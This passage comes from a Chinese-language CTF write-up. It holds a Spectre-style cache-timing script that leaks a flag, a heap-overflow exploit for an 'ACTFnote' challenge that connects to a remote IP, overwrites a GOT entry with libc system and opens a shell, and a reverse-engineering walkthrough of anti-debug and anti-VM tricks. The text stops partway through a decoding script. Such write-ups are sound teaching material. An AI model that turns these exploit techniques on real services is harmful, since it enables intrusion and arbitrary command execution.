class="params">(malicious_x)</span>:</span></span><br><span class="line">	io.recvuntil(<span class="string">'your operation: '</span>)</span><br><span class="line">	io.sendline(str(<span class="number">1</span>))</span><br><span class="line">	io.sendline(str(malicious_x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setTrainingX</span><span class="params">(training_x)</span>:</span></span><br><span class="line">	io.recvuntil(<span class="string">'your operation: '</span>)</span><br><span class="line">	io.sendline(str(<span class="number">2</span>))</span><br><span class="line">	io.sendline(str(training_x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flush_operation</span><span class="params">()</span>:</span></span><br><span class="line">	io.recvuntil(<span class="string">'your operation: '</span>)</span><br><span class="line">	io.sendline(str(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train_operation</span><span class="params">()</span>:</span></span><br><span class="line">	io.recvuntil(<span class="string">'your operation: '</span>)</span><br><span class="line">	io.sendline(str(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">measure_time</span><span class="params">()</span>:</span></span><br><span class="line">	io.recvuntil(<span class="string">'your operation: '</span>)</span><br><span class="line">	io.sendline(str(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear_result</span><span class="params">(result)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">		result[i] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">threshold = <span class="number">130</span>        <span class="comment">#时间阈值根据不同性能的机器灵活调整</span></span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x6020e0</span></span><br><span class="line">array1_addr = <span class="number">0x602040</span></span><br><span class="line">flag_length = <span class="number">43</span></span><br><span class="line">array1_size = <span class="number">16</span></span><br><span class="line">array1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>]</span><br><span class="line">offset = flag_addr - array1_addr</span><br><span class="line">result = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(flag_length):</span><br><span class="line">	setMaliciousX(offset + i)</span><br><span class="line">	<span class="keyword">for</span> tries <span class="keyword">in</span> range(<span class="number">999</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">		flush_operation()</span><br><span class="line">		train_x = tries % array1_size</span><br><span class="line">		setTrainingX(train_x)</span><br><span class="line">		train_operation()</span><br><span class="line">		measure_time()</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">			io.recvuntil(<span class="string">'Index '</span>)</span><br><span class="line">			index = int(io.recvuntil(<span class="string">' consumes '</span>)[:<span class="number">-10</span>])</span><br><span class="line">			<span class="keyword">if</span> index <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">0x20</span>):</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			cputime = int(io.recvuntil(<span class="string">' CPU'</span>)[:<span class="number">-4</span>])</span><br><span class="line">			<span class="keyword">if</span> cputime &lt;= threshold <span class="keyword">and</span> index != array1[tries % array1_size]:</span><br><span class="line">				result[index] += <span class="number">1</span></span><br><span class="line">		firstmax = max(result)</span><br><span class="line">		firstmax_i = result.index(firstmax)</span><br><span class="line">		result[firstmax_i] = <span class="number">0</span></span><br><span class="line">		secondmax = max(result)</span><br><span class="line">		secondmax_i = result.index(secondmax)</span><br><span class="line">		result[firstmax_i] = firstmax</span><br><span class="line">		<span class="keyword">if</span> (firstmax &gt;= <span class="number">2</span> * secondmax + <span class="number">5</span>) <span class="keyword">or</span> (firstmax == <span class="number">2</span> <span class="keyword">and</span> secondmax == <span class="number">0</span>):</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'The character in '</span> + hex(flag_addr + i) + <span class="string">' is '</span> + hex(firstmax_i) + <span class="string">'&lt;'</span> + chr(firstmax_i) + <span class="string">'&gt;. Second best is '</span> + hex(secondmax_i) + <span class="string">'&lt;'</span> + chr(secondmax_i) + <span class="string">'&gt;'</span></span><br><span class="line">	flag += chr(firstmax_i)</span><br><span class="line">	clear_result(result)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Flag is '</span> + flag</span><br></pre></td></tr></table></figure></p>
<p>效果图如下：<br><img src="https://i.imgur.com/hJcdUTS.png" alt></p>
<h3 id="ACTFnote"><a href="#ACTFnote" class="headerlink" title="ACTFnote"></a>ACTFnote</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'47.106.243.209'</span>, <span class="number">10004</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, name, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    r.sendline(<span class="string">'1'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(id, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    r.sendline(<span class="string">'3'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.sendline(str(id))</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.write(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(id)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    r.sendline(<span class="string">'2'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.sendline(str(id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(id)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    r.sendline(<span class="string">'3'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.sendline(str(id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'AAAA'</span>, <span class="string">'AAAA'</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'AAAA'</span>, <span class="string">'A'</span> * <span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'AAAA'</span>, <span class="string">'A'</span> * <span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'A'</span> * <span class="number">0x18</span> + p64(<span class="number">0xd1</span>))  <span class="comment"># note1</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'AAAA'</span>, <span class="string">'A'</span> * <span class="number">0x18</span>)</span><br><span class="line">strlen_got = <span class="number">0x602028</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'AAAA'</span>, p64(strlen_got) + <span class="string">'d'</span> * <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">3</span>, p64(strlen_got))  <span class="comment"># note2</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">r.recvuntil(<span class="string">'content: '</span>)</span><br><span class="line">strlen_addr = u64(r.readline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] strlen addr:&#123;0&#125;"</span>.format(hex(strlen_addr))</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.19.so"</span>)  <span class="comment"># ELF("/lib/x86_64-linux-gnu/libc.so.6")</span></span><br><span class="line">libc_base = strlen_addr - libc.symbols[<span class="string">'strlen'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">edit(<span class="number">2</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="anti全家桶"><a href="#anti全家桶" class="headerlink" title="anti全家桶"></a>anti全家桶</h3><h4 id="考点-10"><a href="#考点-10" class="headerlink" title="考点"></a>考点</h4><p>反虚拟机、反调试、花指令</p>
<h4 id="预备知识-8"><a href="#预备知识-8" class="headerlink" title="预备知识"></a>预备知识</h4><p>花指令1：插入一字节花机器码，比如<code>E8</code>或<code>80</code>，扰乱IDA<strong>线性解析</strong>，使IDA不能正常识别出函数。但实际执行会跳过该机器码，使得实际执行不会出错。</p>
<p>花指令2：依然是扰乱IDA线性解析，不过是插入形如<code>add esp, xx</code>的花指令，IDA发现栈不平衡，故不能正常识别出函数。同样实际执行会跳过该花指令。</p>
<p>反调试1：若程序处于调试状态中，<code>ptrace(PTRACE_TRACEME, 0, 0, 0)</code>的返回值是-1，因此若能有个<code>if</code>判断，判断返回值为-1时程序退出，即可起到反调试的效果。</p>
<p>反调试2：定时器。Linux中有个<code>alarm</code>函数，参数是秒数，当经过了参数那么多秒数的时候，会发出<code>SIGALARM</code>信号，如果再写一个信号处理函数，监听<code>SIGALARM</code>信号，一旦捕捉到该信号就退出程序，也可以加大调试的难度。</p>
<p>反虚拟机1：选手大多是在虚拟机下调试ELF程序，因此若能检测出虚拟机环境，也可起到反调试类似的效果。最基础的方式是检查网卡的<code>MAC</code>地址，一般<code>VMware</code>和<code>Virtualbox</code>都有固定的几个<code>MAC</code>地址前缀，匹配这些特征前缀即可检测出虚拟机环境。</p>
<p>反虚拟机2：汇编指令<code>rdtscp</code>可以精确测量一段指令的执行时间，可以精确到CPU的时钟周期，一般执行同样一段指令，在虚拟机里执行普遍要的时钟周期数要长一些，通过它也可以判断是否处于虚拟机环境中。</p>
<h4 id="解题过程-10"><a href="#解题过程-10" class="headerlink" title="解题过程"></a>解题过程</h4><p>在预备知识小节提到的反逆向技术，这题都用上了。而且如果选手不能以<strong>合适</strong>的方式去除反调试，即使你输入的flag是正确的，程序也说你的flag是错的。</p>
<p>首先拖到IDA里面去，定位到main函数，发现不能F5。仔细观察左侧的地址是标红的，说明IDA无法将其识别成一个函数。然后往后稍微拖动一点，会发现IDA对一个<code>call</code>指令的识别有问题，<code>call</code>的地址无效，然后发现前面有一个必然成立的跳转，跳转到<code>0x40125E+1</code>处的位置<br><img src="https://i.imgur.com/9yrfOx4.png" alt><br>这个就是花指令1和花指令2的结合体，<code>add rsp, 4</code>以及这个<code>call</code>指令的第一个字节<code>E8</code>都是花指令，直接将<code>0x40125A</code>到<code>0x40125E</code>处的5个字节改为机器码<code>90</code>（即汇编指令<code>nop</code>，常用于填充）即可<br><img src="https://i.imgur.com/XtEYZUC.png" alt><br>最后将修改的部分一直到函数末尾一起括起来按C键重新分析，之后将光标点到函数头处按P建立函数，即可按F5进行反编译了<br><img src="https://i.imgur.com/X1i2bWK.png" alt><br>最开始的<code>ptrace</code>函数是反调试，直接用<code>90</code>去掉即可。纵观主函数，发现程序将输入的字符分成了4等份，每等份4个字符，前两等份会进入<code>loc_400CEE</code>进行处理，后两等份会进入<code>sub_400F46</code>处理，处理完后，每等份的4个字符会变成6个，会跟<code>0x6021E0</code>处的一个二进制串进行异或，最后与<code>0x6021C0</code>处的对比串进行比较，如果比对成功则输入正确。<code>loc_400CEE</code>处本应是一个函数，但是没被IDA识别出来，可通过前述类似的方法解决，不再赘述<br><img src="https://i.imgur.com/0mGb5Na.png" alt><br>将<code>0x400CEE</code>处的函数反编译后，发现算法实际上就是一个类似于base64的东西，只是base64是3变4，这里是4变6，且提供的<code>table</code>不一样<br><img src="https://i.imgur.com/7f97zUg.png" alt><br>不过需要关注的是<code>sub_400979</code>这个函数，打开一看，仔细分析，发现是求本机网卡的<code>MAC</code>地址，当<code>MAC</code>前缀是<code>00-05-69</code>或<code>00-0C-29</code>或<code>00-50-56</code>时，会将一些位置的数字进行替换，否则将<code>0x6021E9</code>处的值改成<code>2F</code>。这其实就是反虚拟机1，那些<code>MAC</code>地址就是特征<code>MAC</code><br><img src="https://i.imgur.com/7fGIg3R.png" alt><br>前面说了从<code>0x6021E0</code>开始的24个字节都是最后拿来异或用的，任何对这段串的改变都会影响最后的结果。事实上，最开始这个异或的串的某些位置的值本身就是错误的，如果过了这个反虚拟机检测，将会把它改正确，否则反而会把本来正确的值将其改错，这样最后的异或肯定就不对，达到反虚拟机的效果。</p>
<p>有些选手在意识到这个函数是个反逆向的无用指令后，不仔细分析功能就直接用<code>90</code>填充掉了。但是异或的串本来就有几位是错的，如果直接<code>nop</code>掉，最后异或的结果还是错的，这就要求选手仔细分析该函数是如何反逆向的，从而以合适的方式去掉它。</p>
<p>既然知道只要将<code>0x6021E9</code>处的值改成<code>2F</code>就行了，那就可以只保留这一部分，其他的部分<code>nop</code>掉即可。</p>
<p><code>400CEE</code>分析完了，再分析<code>sub_400F46</code>。这个函数虽然识别出来了，但是识别出来的有错误，或者说没识别完整，见下图所示<br><img src="https://i.imgur.com/KsoCOJY.png" alt><br>还是一样的花指令手法，但是被IDA识别成了两个函数，不能被IDA蒙蔽了，需要删除<code>sub_4010D0</code>这个假函数，填充花指令后重新分析。经过处理后发现就是一个简单的查表替换。这里有<code>400C84</code>和<code>400C9F</code>两个反虚拟机，采用的是预备知识部分讲的反虚拟机2的手法。如果执行<code>xchg eax, ebx</code>的时钟周期大于<code>0x16</code>，则说明大概率处于虚拟机环境，此时会跳过对异或串的赋值。所以若要得到正确的异或串，对异或串的这个赋值不能跳过，只要把相应的跳转<code>nop</code>掉就行了。</p>
<p>最后，这里还存在定时器，不过很隐蔽，从主函数这条线分析是分析不出来的，但是你调试的时候会发现定时就退出了。这个只要去搜一下Imports导入表的<code>alarm</code>函数，交叉引用到调用它的地方（<code>sub_400CCE</code>），<code>nop</code>掉<code>call alarm</code>即可。</p>
<p>解题脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">s_box = [<span class="number">0x63</span>,<span class="number">0x7C</span>,<span class="number">0x77</span>,<span class="number">0x7B</span>,<span class="number">0xF2</span>,<span class="number">0x6B</span>,<span class="number">0x6F</span>,<span class="number">0xC5</span>,<span class="number">0x30</span>,<span class="number">0x01</span>,<span class="number">0x67</span>,<span class="number">0x2B</span>,<span class="number">0xFE</span>,<span class="number">0xD7</span>,<span class="number">0xAB</span>,<span class="number">0x76</span>,<span class="number">0xCA</span>,<span class="number">0x82</span>,<span class="number">0xC9</span>,<span class="number">0x7D</span>,<span class="number">0xFA</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0xF0</span>,<span class="number">0xAD</span>,<span class="number">0xD4</span>,<span class="number">0xA2</span>,<span class="number">0xAF</span>,<span class="number">0x9C</span>,<span class="number">0xA4</span>,<span class="number">0x72</span>,<span class="number">0xC0</span>,<span class="number">0xB7</span>,<span class="number">0xFD</span>,<span class="number">0x93</span>,<span class="number">0x26</span>,<span class="number">0x36</span>,<span class="number">0x3F</span>,<span class="number">0xF7</span>,<span class="number">0xCC</span>,<span class="number">0x34</span>,<span class="number">0xA5</span>,<span class="number">0xE5</span>,<span class="number">0xF1</span>,<span class="number">0x71</span>,<span class="number">0xD8</span>,<span class="number">0x31</span>,<span class="number">0x15</span>,<span class="number">0x04</span>,<span class="number">0xC7</span>,<span class="number">0x23</span>,<span class="number">0xC3</span>,<span class="number">0x18</span>,<span class="number">0x96</span>,<span class="number">0x05</span>,<span class="number">0x9A</span>,<span class="number">0x07</span>,<span class="number">0x12</span>,<span class="number">0x80</span>,<span class="number">0xE2</span>,<span class="number">0xEB</span>,<span class="number">0x27</span>,<span class="number">0xB2</span>,<span class="number">0x75</span>,<span class="number">0x09</span>,<span class="number">0x83</span>,<span class="number">0x2C</span>,<span class="number">0x1A</span>,<span class="number">0x1B</span>,<span class="number">0x6E</span>,<span class="number">0x5A</span>,<span class="number">0xA0</span>,<span class="number">0x52</span>,<span class="number">0x3B</span>,<span class="number">0xD6</span>,<span class="number">0xB3</span>,<span class="number">0x29</span>,<span class="number">0xE3</span>,<span class="number">0x2F</span>,<span class="number">0x84</span>,<span class="number">0x53</span>,<span class="number">0xD1</span>,<span class="number">0x00</span>,<span class="number">0xED</span>,<span class="number">0x20</span>,<span class="number">0xFC</span>,<span class="number">0xB1</span>,<span class="number">0x5B</span>,<span class="number">0x6A</span>,<span class="number">0xCB</span>,<span class="number">0xBE</span>,<span class="number">0x39</span>,<span class="number">0x4A</span>,<span class="number">0x4C</span>,<span class="number">0x58</span>,<span class="number">0xCF</span>,<span class="number">0xD0</span>,<span class="number">0xEF</span>,<span class="number">0xAA</span>,<span class="number">0xFB</span>,<span class="number">0x43</span>,<span class="number">0x4D</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x45</span>,<span class="number">0xF9</span>,<span class="number">0x02</span>,<span class="number">0x7F</span>,<span class="number">0x50</span>,<span class="number">0x3C</span>,<span class="number">0x9F</span>,<span class="number">0xA8</span>,<span class="number">0x51</span>,<span class="number">0xA3</span>,<span class="number">0x40</span>,<span class="number">0x8F</span>,<span class="number">0x92</span>,<span class="number">0x9D</span>,<span class="number">0x38</span>,<span class="number">0xF5</span>,<span class="number">0xBC</span>,<span class="number">0xB6</span>,<span class="number">0xDA</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0xFF</span>,<span class="number">0xF3</span>,<span class="number">0xD2</span>,<span class="number">0xCD</span>,<span class="number">0x0C</span>,<span class="number">0x13</span>,<span class="number">0xEC</span>,<span class="number">0x5F</span>,<span class="number">0x97</span>,<span class="number">0x44</span>,<span class="number">0x17</span>,<span class="number">0xC4</span>,<span class="number">0xA7</span>,<span class="number">0x7E</span>,<span class="number">0x3D</span>,<span class="number">0x64</span>,<span class="number">0x5D</span>,<span class="number">0x19</span>,<span class="number">0x73</span>,<span class="number">0x60</span>,<span class="number">0x81</span>,<span class="number">0x4F</span>,<span class="number">0xDC</span>,<span class="number">0x22</span>,<span class="number">0x2A</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x46</span>,<span class="number">0xEE</span>,<span class="number">0xB8</span>,<span class="number">0x14</span>,<span class="number">0xDE</span>,<span class="number">0x5E</span>,<span class="number">0x0B</span>,<span class="number">0xDB</span>,<span class="number">0xE0</span>,<span class="number">0x32</span>,<span class="number">0x3A</span>,<span class="number">0x0A</span>,<span class="number">0x49</span>,<span class="number">0x06</span>,<span class="number">0x24</span>,<span class="number">0x5C</span>,<span class="number">0xC2</span>,<span class="number">0xD3</span>,<span class="number">0xAC</span>,<span class="number">0x62</span>,<span class="number">0x91</span>,<span class="number">0x95</span>,<span class="number">0xE4</span>,<span class="number">0x79</span>,<span class="number">0xE7</span>,<span class="number">0xC8</span>,<span class="number">0x37</span>,<span class="number">0x6D</span>,<span class="number">0x8D</span>,<span class="number">0xD5</span>,<span class="number">0x4E</span>,<span class="number">0xA9</span>,<span class="number">0x6C</span>,<span class="number">0x56</span>,<span class="number">0xF4</span>,<span class="number">0xEA</span>,<span class="number">0x65</span>,<span class="number">0x7A</span>,<span class="number">0xAE</span>,<span class="number">0x08</span>,<span class="number">0xBA</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0x2E</span>,<span class="number">0x1C</span>,<span class="number">0xA6</span>,<span class="number">0xB4</span>,<span class="number">0xC6</span>,<span class="number">0xE8</span>,<span class="number">0xDD</span>,<span class="number">0x74</span>,<span class="number">0x1F</span>,<span class="number">0x4B</span>,<span class="number">0xBD</span>,<span class="number">0x8B</span>,<span class="number">0x8A</span>,<span class="number">0x70</span>,<span class="number">0x3E</span>,<span class="number">0xB5</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x03</span>,<span class="number">0xF6</span>,<span class="number">0x0E</span>,<span class="number">0x61</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0xB9</span>,<span class="number">0x86</span>,<span class="number">0xC1</span>,<span class="number">0x1D</span>,<span class="number">0x9E</span>,<span class="number">0xE1</span>,<span class="number">0xF8</span>,<span class="number">0x98</span>,<span class="number">0x11</span>,<span class="number">0x69</span>,<span class="number">0xD9</span>,<span class="number">0x8E</span>,<span class="number">0x94</span>,<span class="number">0x9B</span>,<span class="number">0x1E</span>,<span class="number">0x87</span>,<span class="number">0xE9</span>,<span class="number">0xCE</span>,<span class="number">0x55</span>,<span class="number">0x28</span>,<span class="number">0xDF</span>,<span class="number">0x8C</span>,<span class="number">0xA1</span>,<span class="number">0x89</span>,<span class="number">0x0D</span>,<span class="number">0xBF</span>,<span class="number">0xE6</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x41</span>,<span class="number">0x99</span>,<span class="number">0x2D</span>,<span class="number">0x0F</span>,<span class="number">0xB0</span>,<span class="number">0x54</span>,<span class="number">0xBB</span>,<span class="number">0x16</span>]</span><br><span class="line">liangzi = [<span class="number">0x54</span>,<span class="number">0x56</span>,<span class="number">0x4f</span>,<span class="number">0x77</span>,<span class="number">0x34</span>,<span class="number">0x2f</span>,<span class="number">0x40</span>,<span class="number">0x10</span>,<span class="number">0x69</span>,<span class="number">0x2f</span>,<span class="number">0x08</span>,<span class="number">0x74</span>,<span class="number">0x18</span>,<span class="number">0xfc</span>,<span class="number">0xc5</span>,<span class="number">0x72</span>,<span class="number">0xac</span>,<span class="number">0x09</span>,<span class="number">0xcd</span>,<span class="number">0xc0</span>,<span class="number">0x37</span>,<span class="number">0xf3</span>,<span class="number">0x4d</span>,<span class="number">0xd1</span>]</span><br><span class="line">enc_flag = [<span class="string">'1'</span>,<span class="string">'0'</span>,<span class="string">'v'</span>,<span class="string">'3'</span>,<span class="string">'_'</span>,<span class="string">'Y'</span>,<span class="string">'0'</span>,<span class="string">'v'</span>,<span class="string">'_'</span>,<span class="string">'n'</span>,<span class="string">'n'</span>,<span class="string">'0'</span>,<span class="string">'r'</span>,<span class="string">'3'</span>,<span class="string">'_'</span>,<span class="string">'7'</span>,<span class="string">'h'</span>,<span class="string">'a'</span>,<span class="string">'n'</span>,<span class="string">'_'</span>,<span class="string">'3'</span>,<span class="string">'0'</span>,<span class="string">'0'</span>,<span class="string">'0'</span>]</span><br><span class="line">table = [<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'0'</span>,<span class="string">'q'</span>,<span class="string">'w'</span>,<span class="string">'e'</span>,<span class="string">'r'</span>,<span class="string">'t'</span>,<span class="string">'y'</span>,<span class="string">'u'</span>,<span class="string">'i'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'a'</span>,<span class="string">'s'</span>,<span class="string">'d'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'z'</span>,<span class="string">'x'</span>,<span class="string">'c'</span>,<span class="string">'v'</span>,<span class="string">'b'</span>,<span class="string">'n'</span>,<span class="string">'m'</span>,<span class="string">'Q'</span>,<span class="string">'W'</span>,<span class="string">'E'</span>,<span class="string">'R'</span>,<span class="string">'T'</span>,<span class="string">'Y'</span>,<span class="string">'U'</span>,<span class="string">'I'</span>,<span class="string">'O'</span>,<span class="string">'P'</span>,<span class="string">'A'</span>,<span class="string">'S'</span>,<span class="string">'D'</span>,<span class="string">'F'</span>,<span class="string">'G'</span>,<span class="string">'H'</span>,<span class="string">'J'</span>,<span class="string">'K'</span>,<span class="string">'L'</span>,<span class="string">'Z'</span>,<span class="string">'X'</span>,<span class="string">'C'</span>,<span class="string">'V'</span>,<span class="string">'B'</span>,<span class="string">'N'</span>,<span class="string">'M'</span>,<span class="string">'+'</span>,<span class="string">'='</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    enc_flag[i] = chr(ord(enc_flag[i]) ^ liangzi[i])</span><br><span class="line">A_char = []</span><br><span class="line">B_char = []</span><br><span class="line">C_char = []</span><br><span class="line">D_char = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    A_char.append(enc_flag[i])</span><br><span class="line">    B_char.append(enc_flag[i+<span class="number">6</span>])</span><br><span class="line">    C_char.append(enc_flag[i+<span class="number">12</span>])</span><br><span class="line">    D_char.append(enc_flag[i+<span class="number">18</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dechange1</span><span class="params">(arr)</span>:</span></span><br><span class="line">    temp = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    flag = [<span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(table)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">            <span class="keyword">if</span> arr[j] == table[i]:</span><br><span class="line">                temp[j] = i</span><br><span class="line">    flag[<span class="number">0</span>] = chr(((temp[<span class="number">0</span>] &lt;&lt; <span class="number">2</span>) + (temp[<span class="number">1</span>] &gt;&gt; <span class="number">4</span>)) &amp; <span class="number">0xff</span>)</span><br><span class="line">    flag[<span class="number">1</span>] = chr((((temp[<span class="number">1</span>] &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">4</span>) + (temp[<span class="number">2</span>] &gt;&gt; <span class="number">2</span>)) &amp; <span class="number">0xff</span>)</span><br><span class="line">    flag[<span class="number">2</span>] = chr((((temp[<span class="number">2</span>] &amp; <span class="number">3</span>) &lt;&lt; <span class="number">6</span>) + temp[<span class="number">3</span>]) &amp; <span class="number">0xff</span>)</span><br><span class="line">    flag[<span class="number">3</span>] = chr(((temp[<span class="number">4</span>] &lt;&lt; <span class="number">2</span>) + (temp[<span class="number">5</span>] &gt;&gt; <span class="number">4</span>)) &amp; <span class="number">0xff</span>)</span><br><span class="line">    <span class="keyword">return</span> 